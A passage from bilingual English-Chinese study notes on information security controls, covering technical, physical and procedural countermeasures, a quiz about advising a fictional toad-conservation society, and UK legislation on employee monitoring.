malicious.</p><blockquote><p>不幸的是，如果一个系统被恶意软件入侵，防火墙可能最终被绕过或完全关闭，因为这两个进程都在同一个系统上运行，而且可能是由同一个用户运行。防火墙也不能通知它是否被错误配置，而且它可能会通过警告用户可能不是恶意的行为而使用户对警报不敏感</p></blockquote><h5 id="Email-scanners"><a href="#Email-scanners" class="headerlink" title="Email scanners"></a>Email scanners</h5><p>Email scanners scan incoming emails and warn users of malicious content. They do this by scanning incoming files for viruses and warning the user if the email looks like a typical fraudulent message. </p><blockquote><p>扫描传入的电子邮件，并警告用户有恶意内容。它们通过扫描传入文件的病毒，并在电子邮件看起来像典型的欺诈性信息时警告用户</p></blockquote><h5 id="Other-countermeasures"><a href="#Other-countermeasures" class="headerlink" title="Other countermeasures"></a>Other countermeasures</h5><p>There are many other countermeasures that check running processes, open ports, monitor network activity and startup programs. Some of these could also be carried out using some of the <strong>assurance techniques</strong> mentioned for vulnerability assessment, eg vulnerability scans of open ports and running services. Assurance techniques are sometimes referred to as <strong>special types of security controls</strong>.</p><blockquote><p>还有许多其他反制措施，检查运行中的进程、开放的端口、监测网络活动和启动程序。其中一些也可以使用提到的漏洞评估的一些保证技术来进行，例如对开放的端口和运行的服务进行漏洞扫描。保证技术有时被称为特殊类型的安全控制</p></blockquote><h5 id="What-to-look-for-in-a-manufacturer’s-product"><a href="#What-to-look-for-in-a-manufacturer’s-product" class="headerlink" title="What to look for in a manufacturer’s product?"></a>What to look for in a manufacturer’s product?</h5><p>在制造商的产品中要看什么？</p><p>it is sometimes hard to get to know how good a product is, eg anti-malware software.</p><ul><li>Read independent reviews<br>Does it have a high degree of effectiveness in detecting and removing malware?</li><li>Frequency of updates<br>Is the scanner still maintained? Is it aware of the new malware threats?</li><li>Allow list of accepted executables<br>Does it let the organisation control what can be executed on their network?</li><li>Reputable company<br>Is the company likely to stick around?</li><li>Impact on operations<br>Will business be able to continue as usual? Does the software have a major impact on employee productivity?</li></ul><blockquote><ul><li>阅读独立评论<br>它在检测和清除恶意软件方面是否有高度的有效性？</li><li>更新的频率<br>扫描仪是否仍在维护？它是否了解新的恶意软件威胁？</li><li>允许接受的可执行文件列表<br>它是否让组织控制在其网络上可以执行的内容？</li><li>有信誉的公司<br>该公司是否可能坚持下去？</li><li>对业务的影响<br>业务是否能够照常进行？该软件是否对员工的生产力有重大影响？</li></ul></blockquote><h4 id="Network-security"><a href="#Network-security" class="headerlink" title="Network security"></a>Network security</h4><p>The previous section focused on the security of a single computer or device. Why do you think it’s as important to focus on network security as well?</p><p>Let’s say there are 2.5 billion people on the internet. Even if only 1 per cent of that population are malicious users, that’s 25 million potential attackers! Every machine connected to the network is also a potential medium for worms to spread themselves.</p><blockquote><p>比方说，互联网上有25亿人。即使其中只有1%的人是恶意用户，那也有2500万潜在的攻击者! 连接到网络的每台机器也是蠕虫自我传播的潜在媒介</p></blockquote><p>There are three main types of network security controls that we will look at in this section:</p><ul><li>cryptography-based</li><li>intrusion prevention and detection</li><li>managing the topology of the network.</li></ul><h5 id="Cryptography-based-controls"><a href="#Cryptography-based-controls" class="headerlink" title="Cryptography-based controls"></a>Cryptography-based controls</h5><p>Cryptography - The practice and study of techniques for secure communication in the presence of third parties called adversaries. 在有被称为对手的第三方存在的情况下，对安全通信技术的实践和研究</p><table><thead><tr><th align="left">Term</th><th align="left">Definition</th></tr></thead><tbody><tr><td align="left">Confidentiality</td><td align="left">Nobody else can see the plain text.</td></tr><tr><td align="left">Integrity</td><td align="left">The data has not been changed, deleted or inserted.</td></tr><tr><td align="left">Authentication</td><td align="left">The person is who they claim to be.</td></tr><tr><td align="left">Non-repudiation</td><td align="left">The sender cannot later deny sending the message or its content.</td></tr></tbody></table><p>Cryptographical mostly base on utilising <strong>public key infrastructure</strong> (PKI). PKI provides a mechanism for two communicating computers to authenticate each other. This is required to establish an authenticated and end-to-end communication channel. Beyond authentication, it also provides <strong>end-to-end encryption</strong> (E2EE), which is a system of communication where only the communicating users can read the messages.</p><blockquote><p>密码学主要基于利用公钥基础设施（PKI）。PKI为两台通信的计算机提供了一个相互认证的机制。这是建立一个认证和端到端通信渠道所必需的。除了认证，它还提供端到端加密（E2EE），这是一个只有通信用户可以阅读信息的通信系统</p></blockquote><p>One common attack which this approach works well against is the <strong>man in the middle attack</strong>. 这种方法能很好地对付的一种常见攻击是中间人攻击</p><p>This is where the attacker secretly relays and possibly alters the communication between two parties who believe they are directly communicating with each other. If this is not a secure communications channel then the hacker can view and alter messages at will. With E2EE the hacker can only see encrypted messages which to them will look like garbage. As a result, they will not be able to read or alter the messages in transit.</p><blockquote><p>这是指攻击者秘密转发并可能改变双方之间的通信，而双方认为他们是直接沟通的。如果这不是一个安全的通信渠道，那么黑客可以随意查看和改变信息。有了E2EE，黑客只能看到加密的信息，这对他们来说就像垃圾。因此，他们将无法阅读或改变传输中的信息</p></blockquote><p>Another cryptography based approach is the <strong>virtual private network</strong> (VPN). A VPN extends a private network across a public network and enables users to send and receive data across shared or public networks as if their computing devices were directly connected to the private network.</p><blockquote><p>另一种基于密码学的方法是虚拟专用网络（VPN）。VPN在公共网络上扩展了一个私人网络，使用户能够在共享或公共网络上发送和接收数据，就像他们的计算设备直接连接到私人网络一样</p></blockquote><h5 id="Controls-for-intrusion-prevention-and-detection"><a href="#Controls-for-intrusion-prevention-and-detection" class="headerlink" title="Controls for intrusion prevention and detection"></a>Controls for intrusion prevention and detection</h5><p>We already saw that <strong>firewalls</strong> can prevent unwanted intrusions to individual devices. They can do the same for the whole network by checking incoming and outgoing traffic, and only allowing it to go through if it complies with the predefined rules, eg rules based on IP addresses and ports.</p><blockquote><p>防火墙可以防止对个别设备的不必要的入侵。它们可以对整个网络做同样的工作，检查进入和流出的流量，只有当它符合预定义的规则，例如基于IP地址和端口的规则，才允许它通过</p></blockquote><p>There also exist <strong>intrusion detection systems</strong> (IDS) which are the network equivalent of anti-virus software. They detect unwanted intrusions either by analysing models of malicious behaviour such as signatures (misuse-based detection) or by analysing models of normal behaviour (anomaly-based detection). Examples include Snort IDS and Zeek IDS.</p><blockquote><p>还有入侵检测系统（IDS），相当于网络上的反病毒软件。它们通过分析恶意行为的模型，如签名（基于滥用的检测）或通过分析正常行为的模型（基于异常的检测）来检测不需要的入侵行为。例子包括Snort IDS和Zeek IDS</p></blockquote><h5 id="Managing-the-topology-of-the-network"><a href="#Managing-the-topology-of-the-network" class="headerlink" title="Managing the topology of the network"></a>Managing the topology of the network</h5><p><strong>Network partitioning</strong> is the process of creating server zones. Each zone is completely independent of other zones. If a network is hacked we can disconnect a set of servers from the wider network and the hackers won’t be able to access the disconnect partition.</p><blockquote><p>网络分区是创建服务器区的过程。每个区域都完全独立于其他区域。如果网络被黑客攻击，我们可以将一组服务器从更广泛的网络中断开，黑客将无法访问断开的分区</p></blockquote><p>Sometimes partitioning is necessary. In finance, the data server might be completely partitioned to protect against insider trading.</p><blockquote><p>有时分区是必要的。在金融领域，数据服务器可能被完全分区，以防止内幕交易</p></blockquote><p>Another useful concept is the network’s demilitarised zone (DMZ). This is a physical or logical subnetwork that contains and exposes an organisation’s external-facing servers to an untrusted network such as the internet. For instance, the DMZ is normally in between two firewalls, the external facing firewall that allows access to services in the DMZ, such as web server and e-mail server, and then another firewall that protects the internal organisation from the DMZ. In this way, crucial services like web and e-mail that need to be accessed from the internet can be accessed, but those services, if compromised, will not get access to the internal organisational network. </p><blockquote><p>另一个有用的概念是网络的非军事化区（DMZ）。这是一个物理或逻辑的子网络，它包含了一个组织的面向外部的服务器，并将其暴露在一个不受信任的网络中，如互联网。例如，DMZ通常位于两道防火墙之间，面向外部的防火墙允许访问DMZ中的服务，如网络服务器和电子邮件服务器，然后是另一道防火墙，保护内部组织免受DMZ的影响。通过这种方式，需要从互联网上访问的网页和电子邮件等关键服务可以被访问，但这些服务如果被破坏，将无法进入内部组织网络</p></blockquote><h3 id="Physical-controls"><a href="#Physical-controls" class="headerlink" title="Physical controls"></a>Physical controls</h3><p>Physical controls</p><p>Physical controls rely on the presence of physical limitations to the activities that a criminal or other unauthorised person may wish to carry out. 物理控制依赖于对犯罪分子或其他未经授权的人可能希望进行的活动的物理限制</p><p>In order to figure out what physical controls to deploy you might want to consider the following questions.</p><ol><li>Who is the attacker and what are their resources?</li></ol><p>Your choice of control will depend in part on the motivations and resources of the attackers. Here are a few examples of possible attackers. </p><blockquote><p>你对控制的选择将部分取决于攻击者的动机和资源。这里有几个可能的攻击者的例子</p></blockquote><ul><li>Joy hackers</li><li>Organised criminals</li><li>Governments</li></ul><p>It is also necessary to consider the potential skills and resources of the attackers, such as lockpicking, alarm neutralisation, radio jammers, climbing, etc. Are they likely to have detailed knowledge of the facility? What about insider assistance?</p><blockquote><p>还有必要考虑攻击者的潜在技能和资源，如开锁、解除警报、无线电干扰器、攀爬等。他们是否可能对设施有详细的了解？内部人员的协助情况如何？</p></blockquote><ol start="2"><li>What are you trying to protect?</li></ol><p>The choice of control will also depend on what you are trying to protect: 控制方式的选择也将取决于你试图保护的东西</p><ul><li>direct access to computers</li><li>access to telecommunication lines</li><li>access to internal LANs</li><li>access to internal offices</li><li>hard copies, removable media, etc.</li></ul><blockquote><p>对计算机的直接访问<br>对电信线路的访问<br>对内部局域网的访问<br>对内部办公室的访问<br>硬拷贝、可移动媒体等</p></blockquote><p>With computer access, the attacker can try to use a debugger to gain root privileges, replace the BIOS, scan for cryptographic keys or install a keystroke logger. With access to lines and LANs they can plant wiretaps, bypass firewalls or initiate a denial of service attack. Through raiding trash bins outside of the offices they can discover useful discarded information.</p><blockquote><p>有了计算机访问权，攻击者可以尝试使用调试器来获得root权限，更换BIOS，扫描加密密钥或安装击键记录器。通过对线路和局域网的访问，他们可以植入窃听器，绕过防火墙或发起拒绝服务攻击。通过搜查办公室外的垃圾箱，他们可以发现有用的废弃信息</p></blockquote><h3 id="Deploying-protection"><a href="#Deploying-protection" class="headerlink" title="Deploying protection"></a>Deploying protection</h3><h4 id="Employee-Authentication"><a href="#Employee-Authentication" class="headerlink" title="Employee Authentication"></a>Employee Authentication</h4><p>You may want to consider what security controls are used to check an employees identity and what <strong>links the access control to their real world identity</strong>. Think through the following questions.</p><blockquote><p>你可能想考虑用什么安全控制措施来检查雇员的身份，以及什么将访问控制与他们的真实身份联系起来。思考以下问题</p></blockquote><p>How are badge rules or biometrics enforced?</p><p>How are badges authenticated?</p><p>Does the guard check pictures on the badges?</p><p>Is it possible to come in through the door behind someone else, ie ‘tailgate’?</p><p>What happens during a fire alarm?</p><p>How are external service personnel granted access?</p><blockquote><p>徽章规则或生物识别技术是如何实施的？</p><p>徽章是如何被认证的？</p><p>警卫会检查徽章上的照片吗？</p><p>是否可以从别人后面的门进来，即 “尾随”？</p><p>在火警发生时怎么办？</p><p>外部服务人员如何获准进入？</p></blockquote><h4 id="Protection-of-equipment"><a href="#Protection-of-equipment" class="headerlink" title="Protection of equipment"></a>Protection of equipment</h4><p>When thinking about protecting equipment, you need to consider how to deal with two main threats. </p><ol><li><p>Unauthorised staff stealing or damaging equipment.</p></li><li><ul><li>mark equipment to make it less attractive to steal</li><li>use CCTV and similar deterrents (there is an ethical question over monitoring your staff to consider)</li><li>announce an ‘amnesty day’ where staff can return stolen equipment without being charged.</li></ul></li><li><blockquote><p>在设备上做标记，使其不容易被盗<br>使用闭路电视和类似的威慑手段（需要考虑监控员工的道德问题）<br>宣布一个 “特赦日”，让员工归还被盗设备而不被起诉</p></blockquote></li><li><p>Accidental loss of use of some critical equipment.</p></li><li><ul><li>ensure stand-by power generation is available if the main power fails</li><li>put in place maintenance contracts with realistic timings (ie engineers can respond quickly)</li><li>separate hardware electrical circuits (ie if kitchen equipment blows fuses, critical infrastructure is unaffected).</li></ul></li><li><blockquote><p>确保在主电源发生故障时有备用的发电设备<br>签订有实际时间的维修合同（即工程师可以快速响应）<br>独立的硬件电路（即如果厨房设备烧毁保险丝，关键基础设施不受影响）</p></blockquote></li></ol><h4 id="Secure-deletion-of-data"><a href="#Secure-deletion-of-data" class="headerlink" title="Secure deletion of data"></a>Secure deletion of data</h4><p>When disposing of a computer, laptop or any kind of device, it is essential that it is securely wiped and data is <strong>never recoverable</strong>. Simply clicking ‘delete’ is not good enough as information is still in the operating system and on the physical media. It is important to <strong>delete and overwrite</strong> the physical media, potentially multiple times, or destroy the physical media completely.</p><blockquote><p>当处置一台电脑、笔记本电脑或任何种类的设备时，必须安全地擦除，而且数据永远无法恢复。简单地点击 “删除 “是不够的，因为信息仍然存在于操作系统和物理媒体上。重要的是要删除和覆盖物理媒体，可能是多次，或完全销毁物理媒体</p></blockquote><p>Disc drives are actually quite hard to destroy securely as they do not burn easily and are not very chemically reactive. The recommendation is to open the drives, demagnetise the platters, crush or deform them, burn them, then finally to separate the remains.</p><blockquote><p>光盘驱动器实际上很难安全地销毁，因为它们不容易燃烧，而且化学反应性不强。建议是打开驱动器，使盘片消磁，压碎或使其变形，烧毁，然后最后分离残骸</p></blockquote><p>Additionally, if an organisation hands over hard-drives to a <strong>contractor</strong> to destroy, how will the destruction be verified? <strong>Backups</strong> of the deleted data are also likely to exist so it’s important to think through how deleted files can be removed from backups in an equally secure way.</p><blockquote><p>如果一个组织将硬盘交给承包商销毁，如何验证销毁情况？被删除的数据的备份也可能存在，所以必须考虑如何以一种同样安全的方式从备份中删除文件</p></blockquote><p>It is also very important to consider how to securely <strong>destroy paper documents</strong>. Attackers can reassemble a shredded document if a cheap paper shredder is used and all the strips are thrown away together. It is much more secure to use a product which shreds more thoroughly or simply burn the file.</p><blockquote><p>考虑如何安全地销毁纸质文件也是非常重要的。如果使用廉价的碎纸机，并将所有的纸条一起扔掉，攻击者可以重新组装碎纸文件。使用一个能更彻底地粉碎的产品或简单地烧毁文件要安全得多</p></blockquote><h3 id="Procedural-controls"><a href="#Procedural-controls" class="headerlink" title="Procedural controls"></a>Procedural controls</h3><p>The last type of controls we will look at are the procedural type, also called <strong>social security</strong> controls. These types of controls cover the rules, regulations and policies that an organisation puts in place to help reduce the risk of issues arising.</p><blockquote><p>也叫社会安全控制。这些类型的控制涵盖了一个组织为帮助减少问题发生的风险而制定的规则、条例和政策</p></blockquote><p>These are often specific <strong>policies</strong> which address security issues in more detail than the broader organisational ones. Sometimes they contain not only policies but also standards, procedures and guidelines. In order to help users comply with the policies, user training is necessary.</p><blockquote><p>这些通常是具体的政策，比更广泛的组织性政策更详细地解决安全问题。有时它们不仅包含政策，还包含标准、程序和指南。为了帮助用户遵守这些政策，用户培训是必要的</p></blockquote><p>One example of such a policy is the <strong>clear screen and desk policy</strong> that aims to protect confidential documents within the office space. In an open office your colleagues can watch your screen as they walk past and during a fire alarm someone can access your machine uninterrupted if it is unlocked. The policy might specify that you should always lock your screen when you are leaving your desk. It might be helpful to address common scenarios during the user training such as a fire drill, going to the toilet or making a cup of tea.</p><blockquote><p>这种政策的一个例子是透明屏幕和办公桌政策，其目的是保护办公空间内的机密文件。在一个开放的办公室里，你的同事走过时可以看到你的屏幕，在火警发生时，如果你的机器没有上锁，有人可以不受干扰地访问你的机器。政策可能会规定，当你离开你的办公桌时，你应该始终锁定你的屏幕。在用户培训中讨论一些常见的情况可能会有帮助，比如火灾演习、上厕所或泡茶</p></blockquote><p>Similarly, a policy can state <strong>how paper documents must be treated</strong>, such as being locked away at all times. It can be more specific and strict such as forbidding the use of sticky notes and mandating that each desk must be clear of paper before the end of the day.</p><blockquote><p>政策可以说明必须如何对待纸质文件，例如在任何时候都要锁起来。它可以更加具体和严格，如禁止使用便条，规定每张桌子在下班前必须清除纸张</p></blockquote><p>Policies must be realistic and enforceable, so it’s always necessary to consider the balance of practicality and risk.</p><blockquote><p>政策必须是现实的和可执行的，所以总是需要考虑实用性和风险的平衡</p></blockquote><p>For networks, there usually exists a <strong>network acceptable use policy</strong>. This is a set of rules applied by the owner, creator or administrator of a network, website or a service, that restricts the ways in which the network, website or service may be used and sets guidelines as to how it should be used. For example specifying that only the employees are allowed to use it, whether the network is monitored and who is monitoring it, what the network can be used for and what it must not be used for, etc.</p><blockquote><p>对于网络，通常有一个网络可接受使用政策。这是一套由网络、网站或服务的所有者、创建者或管理者应用的规则，它限制了网络、网站或服务的使用方式，并为如何使用它制定了准则。例如，规定只有员工可以使用，网络是否被监控，谁在监控，网络可以用来做什么，不得用来做什么，等等</p></blockquote><p>Users need to comply with the specific policies and the organisational policies, standards, and procedures, eg by contract. ﻿Providing appropriate <strong>security training</strong> will further help individuals understand their security responsibilities, how the enterprise’s information assets can be put at risk, and how they can avoid that.</p><blockquote><p>用户需要遵守具体的政策和组织的政策、标准和程序，例如通过合同。 ﻿提供适当的安全培训将进一步帮助个人了解他们的安全责任，企业的信息资产如何被置于风险之中，以及他们如何避免这种情况</p></blockquote><h3 id="Quiz"><a href="#Quiz" class="headerlink" title="Quiz"></a>Quiz</h3><h4 id="Q1"><a href="#Q1" class="headerlink" title="Q1"></a>Q1</h4><p>Physical access does not provide the attacker with any significant advantage.</p><p>The sentence is not true. Physical access allows the attacker to potentially bypass a huge number of other security controls and gives them a great advantage. With physical access, the attacker can try to use a debugger to gain root privileges, replace the BIOS, scan for cryptographic keys or install a keystroke logger. With access to lines and LANs they can plant wiretaps, bypass firewalls or initiate a denial of service attack. Through raiding trash bins outside of the offices they can discover useful discarded information.</p><blockquote><p>物理访问使攻击者有可能绕过大量的其他安全控制，并给他们带来巨大的优势。通过物理访问，攻击者可以尝试使用调试器来获得root权限，更换BIOS，扫描加密密钥或安装击键记录器。通过对线路和局域网的访问，他们可以植入窃听器，绕过防火墙或发起拒绝服务攻击。通过搜查办公室外的垃圾箱，他们可以发现有用的废弃信息</p></blockquote><h4 id="Q2"><a href="#Q2" class="headerlink" title="Q2"></a>Q2</h4><p>We don’t need to read the contents of an email to detect potential misuse or threat.</p><p>This is true - in general, analysing the metadata is sufficient. For example knowing the recipient of an email, time and frequency of communications, where did the sender connect from, etc, is usually enough to get a sense of what is going on without needing to read the actual message contents.</p><blockquote><p>一般来说，分析元数据就足够了。例如，知道电子邮件的收件人、通信的时间和频率、发件人是从哪里连接的等等，通常足以让人了解发生了什么，而不需要阅读实际的信息内容</p></blockquote><h4 id="Q3"><a href="#Q3" class="headerlink" title="Q3"></a>Q3</h4><p>GANT的董事会决定，他们需要建立一个更好的方式来沟通他们之间以及与社会成员之间的联系。一些成员报告说，他们已经成为在电子邮件中向他们发送恶意软件或试图提取有关蟾蜍种群数据的人的目标。</p><p>董事会成员没有这方面的计算机知识，需要咨询如何保护他们在家里和GANT办公室的系统免受恶意软件的侵害。敏感的会员资格或蟾蜍数量数据的丢失或未经授权的披露将是令人尴尬的，并有可能对人类和两栖动物造成伤害。</p><p>What advice would you give to the society with regard to the countermeasures they need in order to provide an adequate level of protection from malware?</p><p>First of all, recall that any decisions on the security controls to be implemented should be based on a risk analysis. In this case, there is a need to balance the risk of malware against the costs of purchasing and implementing countermeasures.</p><blockquote><p>任何关于要实施的安全控制的决定都应该基于风险分析。在这种情况下，有必要平衡恶意软件的风险与购买和实施反措施的成本</p></blockquote><p>A good starting point would be to:</p><ul><li>have a combination of anti-virus and personal firewall programs on each PC that has a connection to the internet or is networked to another computer that does</li><li>choose a product that will also restrict the executables that will run on that computer to a known list of authorised products</li><li>change all the default settings in operating systems, applications and browsers, for example passwords, configurations, open ports and so on, to make it harder for malware to compromise the computer</li><li>apply patches to the operating system and applications promptly</li><li>have a backup policy in place.</li></ul><blockquote><ul><li>在每台连接到互联网或与另一台连接到互联网的计算机联网的计算机上，都有一个反病毒和个人防火墙的组合程序</li><li>选择一种产品，同时将在该计算机上运行的可执行文件限制在已知的授权产品列表中</li><li>改变操作系统、应用程序和浏览器的所有默认设置，例如密码、配置、开放端口等，以使恶意软件更难入侵计算机</li><li>及时给操作系统和应用程序打上补丁</li><li>制定一个备份政策</li></ul></blockquote><p>Other countermeasures could also be considered depending on the financial capability of GANT (eg network firewall or IDS, etc).</p><blockquote><p>根据GANT的财务能力，也可以考虑其他对策（如网络防火墙或IDS等）</p></blockquote><h4 id="Q4"><a href="#Q4" class="headerlink" title="Q4"></a>Q4</h4><p>Some people at GANT do not really understand the need to apply patches to combat malware. Why is it important to download and apply a software patch as soon as possible? Please explain your answer and provide an example.</p><blockquote><p>GANT 的一些人并不真正了解应用补丁来对抗恶意软件的必要性。为什么尽快下载并应用软件补丁很重要？</p></blockquote><p>Downloading and applying a software patch as soon as possible is very important because threats could exploit any vulnerabilities in the software. For instance, malware is known to precisely exploit vulnerabilities in software.</p><p>Even worse, when a patch/update is released, hackers can more easily <strong>reverse-engineer</strong> it to write the exploit for the vulnerability the patch is trying to solve. Therefore, the more you delay patching the software, the more likely it is that an exploit will have been created to take advantage of the vulnerability.</p><blockquote><p>尽快下载和应用软件补丁是非常重要的，因为威胁可能利用软件中的任何漏洞。例如，众所周知，恶意软件正是利用了软件中的漏洞</p><p>更糟糕的是，当一个补丁/更新发布后，黑客可以更容易地反向设计它，为补丁试图解决的漏洞编写利用程序。因此，你越是推迟给软件打补丁，就越有可能产生一个利用该漏洞的漏洞</p></blockquote><h4 id="Q5"><a href="#Q5" class="headerlink" title="Q5"></a>Q5</h4><p>The chairman of GANT, Ms Rachel Jackson, is going to follow the advice about buying anti-malware security controls, but she is lost on which products to buy. Do you have any tips for Ms Jackson on how to pick a suitable product?</p><p>Choosing a good security product is difficult. However, some tips include:</p><table><thead><tr><th><strong>Read independent reviews</strong></th><th>Does it have a high degree of effectiveness in detecting and removing malware?</th></tr></thead><tbody><tr><td><strong>Frequency of updates</strong></td><td>Is the scanner still maintained? Is it aware of new malware threats?</td></tr><tr><td><strong>Whitelist of accepted executables</strong></td><td>This will let the organisation control what can be executed on their network.</td></tr><tr><td><strong>Reputable company</strong></td><td>If you are going to buy an expensive licence, make sure the company will stick around!</td></tr><tr><td><strong>Impact on operations</strong></td><td>If the scanner will mean your employees can no longer do their work, you’ll need to find another solution.</td></tr></tbody></table><h4 id="Q6"><a href="#Q6" class="headerlink" title="Q6"></a>Q6</h4><p>The officers of GANT have decided that they need to establish a better means for Information Security. They are now convinced they need to buy security products to achieve this (eg anti-virus). However, they seem to think that simply by using these products they will achieve security.</p><p>What <strong>other</strong> types of security controls would you suggest GANT should look at? For each type, give one example.</p><blockquote><p>你建议GANT应该关注哪些其他类型的安全控制？对于每一种类型，请举出一个例子</p></blockquote><p>In addition to technical security controls, there are also physical and procedural (or social) security controls.</p><p><strong>Physical controls</strong> rely on physical limitations to prevent the activities that a criminal or other unauthorised person might wish to carry out. An example is <strong>secure deletion</strong>.</p><p><strong>Procedural controls</strong> are those controls that cover the rules, regulations and policies that an organisation puts in place to help reduce the risk of issues arising. An example is a <strong>clear screen and desk policy</strong>.</p><blockquote><p>除了技术安全控制，还有物理和程序（或社会）安全控制</p><p>物理控制依靠物理限制来防止罪犯或其他未经授权的人可能希望进行的活动。一个例子是安全删除</p><p>程序控制是指那些涵盖了一个组织为帮助减少问题发生的风险而制定的规则、条例和政策的控制。一个例子是明确的屏幕和桌面政策</p></blockquote><h4 id="Q7"><a href="#Q7" class="headerlink" title="Q7"></a>Q7</h4><p>GANT has recently acquired a new computer to store the digital data they hold about members and about toad populations.</p><p>As a result, they are going to decommission the previous computer they are using. They would like to also make sure that the data in the computer is deleted. Discuss at least two methods that could be employed.</p><blockquote><p>他们想确保电脑中的数据被删除。讨论至少两种可以采用的方法</p></blockquote><p>One method consists of overwriting the physical media several times. Another method is to destroy the physical media.</p><blockquote><p>一种方法包括多次覆盖物理介质，另一种方法是销毁物理介质</p></blockquote><h4 id="Q8"><a href="#Q8" class="headerlink" title="Q8"></a>Q8</h4><p>Due to a recent breach, GANT have grown increasingly concerned about their security, and thanks to your explanations they are now very aware that procedural aspects may play a role in making GANT more secure.</p><p>As such, they have come up with the brilliant idea of monitoring all actions of GANT employees so that they could see whether procedures are being adhered to. What would your advice be on this course of action?</p><blockquote><p>因此，他们想出了一个绝妙的主意，即监控GANT员工的所有行为，这样他们就可以看到程序是否被遵守了。你对这个行动方案有什么建议？</p></blockquote><p>First of all, GANT need to consider that there are applicable laws to consider here, which means that they cannot just do whatever they think is needed to monitor their employees, eg the Data Protection Act (DPA).</p><p>Second, GANT should consider whether they actually need to monitor all actions of their employees, or whether they could have more formal processes to check for compliance which would achieve the same results.</p><p>Finally, they should consider what impact this introduction may have on the actual GANT business objectives. For example, is this preventing employees from carrying out their job adequately or making it more cumbersome?</p><blockquote><p>首先，GANT需要考虑到这里有适用的法律需要考虑，这意味着他们不能只做他们认为需要的任何事情来监督他们的员工，例如《数据保护法》（DPA）</p><p>其次，GANT应该考虑他们是否真的需要监督员工的所有行为，或者他们是否可以有更正式的程序来检查合规性，从而达到同样的效果</p><p>最后，他们应该考虑这种做法对GANT的实际业务目标可能产生什么影响。例如，这是否会妨碍员工充分开展工作或使工作更加繁琐？</p></blockquote><h2 id="Security-Controls-Legislation-Cloud-Security-Security-Economics"><a href="#Security-Controls-Legislation-Cloud-Security-Security-Economics" class="headerlink" title="Security Controls Legislation, Cloud Security, Security Economics"></a>Security Controls Legislation, Cloud Security, Security Economics</h2><h3 id="Relevant-legislation-for-Security-Controls"><a href="#Relevant-legislation-for-Security-Controls" class="headerlink" title="Relevant legislation for Security Controls"></a>Relevant legislation for Security Controls</h3><p>Legislation applies to all types of security controls: technical, physical and procedural. Whether writing policy, designing CCTV or other monitoring systems, procuring storage and backup from third parties, everything needs to be checked against relevant legislation.</p><blockquote><p>立法适用于所有类型的安全控制：技术、物理和程序。无论是编写政策、设计闭路电视或其他监控系统，还是从第三方采购存储和备份，一切都需要对照相关法律进行检查</p></blockquote><table><thead><tr><th align="left">Act</th><th align="left">Relevance</th></tr></thead><tbody><tr><td align="left">Data Protection Act (DPA)</td><td align="left">Recently updated in 2018 with GDPR. It defines how data should be protected and used.</td></tr><tr><td align="left">Human Rights Act (HRA)</td><td align="left">All security controls and policies must respect human rights.</td></tr><tr><td align="left">Financial Services Act (FSA)</td><td align="left">A new regulatory framework for the financial system and financial services in the UK. It’s important if you work in the financial industry.</td></tr><tr><td align="left">Official Secrets Act (OSA)</td><td align="left">Required for government and defence projects.</td></tr><tr><td align="left">Markets in Financial Instruments Directive (MiFID)</td><td align="left">Investment intermediaries that provide services to clients around shares, bonds, units in collective investment schemes and derivatives. 向客户提供股票、债券、集体投资计划单位和衍生品相关服务的投资中介机构</td></tr><tr><td align="left">Freedom of Information Act</td><td align="left">A public ‘right of access’ to information held by public authorities.</td></tr></tbody></table><p>Privacy laws exist to protect the <strong>rights of individuals</strong>. Most organisations hold and process your data, but compliance restricts what can be done with it. Organisations need to ensure that all information is surrounded by robust security controls and working practices, processes are implemented to ensure data is entered correctly (or can be corrected), and that paper records are locked away, computer screens turned off, and information is destroyed securely.</p><blockquote><p>隐私法的存在是为了保护个人的权利。大多数组织都持有和处理你的数据，但合规性限制了可以用它做什么。组织需要确保所有的信息都被强大的安全控制和工作实践所包围，实施各种程序以确保数据被正确输入（或可以被纠正），并确保纸质记录被锁起来，计算机屏幕被关闭，信息被安全地销毁</p></blockquote><p>The <strong>rights of employees</strong> are also vital to consider. Several of the technical controls rely on monitoring the organisation’s computer systems and activity of their employees. However employees always have the right to privacy, they have the right to know what data is held on them by their employer, and they have the right to know the scale and purpose of monitoring being carried out by their enterprise. Freedom of Information Act also applies to employees.</p><blockquote><p>雇员的权利也是必须考虑的。一些技术控制措施依赖于监控组织的计算机系统和员工的活动。然而，员工始终有隐私权，他们有权知道雇主持有他们的哪些数据，他们有权知道他们的企业正在进行的监控的规模和目的。信息自由法也适用于雇员</p></blockquote><p>Why would the enterprise want to monitor employees’ actions?</p><p>The enterprise might want to understand the traffic of emails and its impact on performance, and to protect against illicit or malicious use of the organisation’s computers.</p><blockquote><p>企业可能想了解电子邮件的流量及其对业绩的影响，并防止组织的计算机被非法或恶意使用</p></blockquote><p>Must employees agree to monitoring?</p><p>Yes, it’s usually included in the employment contract. However, monitoring must be assessed to ensure it is justified and meets legal requirements.</p><blockquote><p>必须对监控进行评估，以确保它是合理的并符合法律要求</p></blockquote><p>What if personal information is discovered during monitoring?</p><p>Sensitivity must be employed and the employee should be requested to delete all personal information.</p><blockquote><p>必须采用敏感度，应要求员工删除所有的个人信息</p></blockquote><p>What if an employee is suspected as an insider threat?</p><p>It is rarely justifiable to employ covert monitoring without the employees’ knowledge. Existing evidence can be used for employment tribunal or court cases, however.</p><blockquote><p>在员工不知情的情况下采用秘密监控很少是合理的。然而，现有的证据可用于就业法庭或法庭案件</p></blockquote><p>Finally, it is worth emphasising that most of the time when gathering information we care only about the <strong>meta-data</strong> (data about data), not the data itself. For example knowing the recipient of an email, time and frequency of communications, where did the sender connect from, etc, is usually enough to get a sense of what is going on without needing to read the actual message contents. This is the approach used and justified by government security agencies, for example.</p><blockquote><p>在收集信息时，大多数时候我们只关心元数据（关于数据的数据），而不是数据本身。例如，知道一封电子邮件的收件人、通信的时间和频率、发件人是从哪里连接的等等，通常足以让我们了解发生了什么，而不需要阅读实际的信息内容。例如，这是政府安全机构使用的方法，也是合理的</p></blockquote><h3 id="Security-of-cloud-computing"><a href="#Security-of-cloud-computing" class="headerlink" title="Security of cloud computing"></a>Security of cloud computing</h3><h4 id="What-is-cloud-computing"><a href="#What-is-cloud-computing" class="headerlink" title="What is cloud computing?"></a>What is cloud computing?</h4><p>The practice of using a network of remote servers hosted on the Internet to store, manage, and process data, rather than a local server or a personal computer. </p><blockquote><p>使用互联网上托管的远程服务器网络来存储、管理和处理数据的做法，而不是使用本地服务器或个人电脑</p></blockquote><p>Wikipedia</p><p>In other words, the data is stored and processed remotely. Examples include Microsoft Azure and Amazon Web Services 